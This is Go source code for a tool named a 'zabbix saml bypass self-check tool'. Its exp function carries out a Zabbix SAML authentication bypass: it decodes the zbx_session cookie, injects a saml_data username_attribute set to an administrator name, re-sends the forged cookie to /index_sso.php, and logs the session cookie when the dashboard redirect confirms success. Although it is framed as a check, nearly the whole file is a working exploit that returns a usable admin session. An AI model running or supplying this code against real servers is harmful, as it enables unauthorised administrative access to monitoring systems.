package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"github.com/kataras/golog"
	"github.com/urfave/cli/v2"
	"github.com/xiecat/xhttp"
	"net/http"
	"net/url"
	"os"
)

func main() {
	app := &cli.App{
		Name:  "zabbix saml bypass self-check tool",
		Usage: "developed by jweny(https://github.com/jweny)",
		Commands: []*cli.Command{
			{
				Name:    "check",
				Aliases: []string{"c"},
				Usage:   "check multi assets",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:     "target",
						Aliases:  []string{"t"},
						Usage:    "target for check",
						Required: true,
					},
					&cli.StringFlag{
						Name:     "username",
						Aliases:  []string{"u"},
						Usage:    "default username",
						Required: true,
					},
				},
				Action: func(c *cli.Context) error {
					target := c.String("target")
					req, err := http.NewRequest("GET", target, nil)
					if err != nil {
						return err
					}
					defaultUsername := c.String("username")
					if defaultUsername == "" {
						defaultUsername = "Admin"
					}
					if result, cookie := exp(req, defaultUsername); result {
						golog.Infof("vul exist! target: %s, cookie: %s", target, cookie)
					}
					return nil
				},
			},
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		golog.Fatal(err)
	}
}

func exp(req *http.Request, defaultName string) (bool, string) {
	c, err := xhttp.NewDefaultClient(nil)
	if err != nil {
		return false, ""
	}
	xReq := &xhttp.Request{RawRequest: req}
	ctx := context.Background()

	resp, err := c.Do(ctx, xReq)
	if err != nil {
		return false, ""
	}

	if !bytes.Contains(resp.Body, []byte("SAML")) {
		return false, ""
	}
	mayVul := false
	var cookie *http.Cookie
	for _, c := range resp.RawResponse.Cookies() {
		if c.Name == "zbx_session" {
			mayVul = true
			cookie = c
			break
		}
	}
	if !mayVul {
		return false, ""
	}

	zabbixSession, err := url.PathUnescape(cookie.Value)
	if err != nil {
		return false, ""
	}
	zabbixSessionBytes, err := base64.StdEncoding.DecodeString(zabbixSession)
	if err != nil {
		return false, ""
	}
	sign := make(map[string]interface{})
	err = json.Unmarshal(zabbixSessionBytes, &sign)
	if err != nil {
		return false, ""
	}
	sign["saml_data"] = map[string]string{
		"username_attribute": defaultName,
	}
	signBytes, err := json.Marshal(sign)
	if err != nil {
		return false, ""
	}
	cookie.Value = url.PathEscape(base64.StdEncoding.EncodeToString(signBytes))
	xReq.RawRequest.AddCookie(cookie)
	xReq.RawRequest.URL.Path = "/index_sso.php"

	resp, err = c.Do(ctx, xReq)
	if err != nil {
		return false, ""
	}
	if resp.GetStatus() == 302 && resp.GetHeaders().Get("Location") == "zabbix.php?action=dashboard.view" {
		return true, cookie.Raw
	}
	return false, ""
}
